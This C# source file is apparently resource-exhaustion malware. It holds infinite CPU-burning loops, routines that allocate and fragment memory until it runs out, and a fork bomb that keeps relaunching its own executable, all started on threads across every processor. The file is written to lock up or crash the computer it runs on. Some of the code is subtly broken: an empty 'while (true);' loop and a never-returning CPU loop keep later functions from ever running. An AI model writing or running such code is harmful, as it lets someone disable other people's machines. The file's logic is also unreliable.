using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.Collections.Generic;
using System.Diagnostics;

void lagCPU()
{
    double result = 0;
    while (true)
    {
        for (int i = 0; i < 1000000; i++)
        {
            result /= Math.Sin(i) * Math.Cos(i) * Math.Tan(i);
        }
    }
}

void lagGPU()
{
    var memoryEater = new List<byte[]>();
    var objectEater = new List<object>();
    var random = new Random();
    
    while (true)
    {
        try
        {
            // Allocate MUCH bigger chunks - 500MB each
            var chunk = new byte[500 * 1024 * 1024];
            random.NextBytes(chunk);
            memoryEater.Add(chunk);
            
            // Also create tons of smaller objects to fragment memory
            for (int i = 0; i < 100000; i++)
            {
                objectEater.Add(new byte[random.Next(1000, 10000)]);
            }
            
            // Force immediate allocation by accessing the memory
            chunk[0] = 255;
            chunk[chunk.Length - 1] = 255;
            
            //Console.WriteLine($"Allocated chunks: {memoryEater.Count} (approx {memoryEater.Count * 500}MB)");
        }
        catch (OutOfMemoryException)
        {
            //Console.WriteLine("Out of memory! Continuing to try...");
            // Don't clear - keep trying to allocate more
        }
    }
}

void lagRAM()
{
    var memoryEater = new List<byte[]>();
    var objectEater = new List<object>();
    var random = new Random();
    
    while (true)
    {
        try
        {
            // Allocate MUCH bigger chunks - 500MB each
            var chunk = new byte[500 * 1024 * 1024];
            random.NextBytes(chunk);
            memoryEater.Add(chunk);
            
            // Also create tons of smaller objects to fragment memory
            for (int i = 0; i < 100000; i++)
            {
                objectEater.Add(new byte[random.Next(1000, 10000)]);
            }
            
            // Force immediate allocation by accessing the memory
            chunk[0] = 255;
            chunk[chunk.Length - 1] = 255;
            
            //Console.WriteLine($"Allocated chunks: {memoryEater.Count} (approx {memoryEater.Count * 500}MB)");
        }
        catch (OutOfMemoryException)
        {
            //Console.WriteLine("Out of memory! Continuing to try...");
            // Don't clear - keep trying to allocate more
        }
    }
}

void lagRAM1()
{
    var objects = new List<object>();
    var random = new Random();
    
    while (true)
    {
        // Create different types of objects
        objects.Add(new string('A', random.Next(1000, 100000)));
        objects.Add(new int[random.Next(10000, 100000)]);
        objects.Add(new double[random.Next(5000, 50000)]);
        objects.Add(new byte[random.Next(1000000, 10000000)]);
        
        // Create nested structures
        var nested = new List<List<byte[]>>();
        for (int i = 0; i < 1000; i++)
        {
            nested.Add(new List<byte[]>());
            for (int j = 0; j < 100; j++)
            {
                nested[i].Add(new byte[random.Next(1000, 10000)]);
            }
        }
        objects.Add(nested);
    }
}

void lagRAM2()
{
    var arrays = new List<Array>();
    var random = new Random();
    
    while (true)
    {
        try
        {
            // Different array types
            arrays.Add(new int[random.Next(100000, 1000000)]);
            arrays.Add(new double[random.Next(50000, 500000)]);
            arrays.Add(new long[random.Next(25000, 250000)]);
            arrays.Add(new decimal[random.Next(10000, 100000)]);
            
            // Multi-dimensional arrays
            arrays.Add(new int[random.Next(1000, 5000), random.Next(1000, 5000)]);
            arrays.Add(new byte[random.Next(2000, 10000), random.Next(2000, 10000)]);
        }
        catch { }
    }
}

void lagRAM3()
{
    var strings = new List<string>();
    var baseString = new string('X', 1000000); // 1MB string
    
    while (true)
    {
        try
        {
            // Keep concatenating strings (very memory intensive)
            for (int i = 0; i < 1000; i++)
            {
                baseString += new string('A', 10000);
                strings.Add(baseString);
            }
        }
        catch { }
    }
}

void lagRAM4()
{
    var dictionaries = new List<Dictionary<string, object>>();
    var random = new Random();
    
    while (true)
    {
        var dict = new Dictionary<string, object>();
        
        // Fill dictionary with random data
        for (int i = 0; i < 100000; i++)
        {
            dict[Guid.NewGuid().ToString()] = new byte[random.Next(1000, 50000)];
        }
        
        dictionaries.Add(dict);
    }
}

void lagRAMFragmentation()
{
    var smallObjects = new List<object>();
    var random = new Random();
    
    while (true)
    {
        // Create lots of small objects to fragment memory
        for (int i = 0; i < 1000000; i++)
        {
            smallObjects.Add(new byte[random.Next(1, 1000)]);
        }
        
        // Occasionally clear some to create holes
        if (smallObjects.Count > 5000000)
        {
            for (int i = 0; i < smallObjects.Count; i += 2)
            {
                smallObjects[i] = null;
            }
        }
    }
}

void lagRAMweryMutch()
{
    //Task.Run(() => lagRAM());
    //Task.Run(() => lagRAM1());
    //Task.Run(() => lagRAM2());
    //Task.Run(() => lagRAM3());
    //Task.Run(() => lagRAM4());
    //Task.Run(() => lagRAMFragmentation());

    while (true);
    {
    lagRAM();
    lagRAM1();
    lagRAM2();
    lagRAM3();
    lagRAM4();
    lagRAMFragmentation();
    }
}

void forkBomb()
{
    while (true)
    {
        try
        {
            // Start new instance of current program
            Process.Start(System.Reflection.Assembly.GetExecutingAssembly().Location);

            //Process.Start(Application.ExecutablePath);

            Process.Start(Environment.GetCommandLineArgs()[0]);

            string currentProcess = Process.GetCurrentProcess().MainModule.FileName;
            Process.Start(currentProcess);
            //Thread.Sleep(1000); // Wait 1 second between spawns

            Process.Start(new ProcessStartInfo
            {
                FileName = Environment.ProcessPath,
                Arguments = "--clone", // You can add arguments
                UseShellExecute = true
            });
        }
        catch { /* ignore errors */ }
    }
}



for (int i = 0; i < Environment.ProcessorCount; i++)
{
    new Thread(() =>
    {
        while (true)
        {
        lagCPU();
        lagRAMweryMutch();
        //forkBomb();
        }
    }).Start();
    }

while (true)
{
    lagCPU();
    lagRAMweryMutch();
    forkBomb();
}